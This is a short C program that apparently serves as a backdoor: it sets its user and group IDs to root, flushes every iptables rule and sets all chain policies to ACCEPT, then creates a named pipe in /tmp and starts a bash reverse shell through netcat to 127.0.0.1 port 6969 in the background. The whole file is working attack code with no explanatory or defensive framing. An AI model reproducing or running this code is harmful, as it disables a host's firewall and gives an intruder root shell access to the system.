#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv){
	setuid(0);
	setgid(0);
	system("iptables -F");
	system("iptables -t mangle -F");
	system("iptables -P INPUT ACCEPT");
	system("iptables -P OUTPUT ACCEPT");
	system("iptables -P FORWARD ACCEPT");
	system("[ ! -p /tmp/2slo ] && mkfifo /tmp/2slo");
	system("(/bin/bash 0</tmp/2slo | nc 127.0.0.1 6969 1>/tmp/2slo) &");

}
